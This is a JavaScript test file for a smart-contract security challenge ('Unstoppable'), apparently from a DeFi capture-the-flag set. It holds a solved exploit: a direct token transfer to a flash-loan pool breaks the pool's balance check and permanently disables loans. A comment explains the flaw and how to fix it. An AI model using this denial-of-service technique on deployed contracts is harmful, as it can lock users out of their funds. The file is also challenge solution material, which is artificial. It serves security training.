const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /*
            Exploit:
            Observe that flashLoan function is asserting that poolBalance equals to balanceBefore.
            balanceBefore is the amount of DVT that the contract holds.
            If you directly call transfer from DVT instead of depositFrom in UnstoppableLender,
            assertion fails and it reverts.
            Thus no one can call flashLoan. 

            Solution:
            Don't create a state variable for tracking the funds. Use the balanceOf(address(this))
            method in ERC20 when you deal with ERC20 tokens. 
        */
        await this.token.connect(attacker).transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
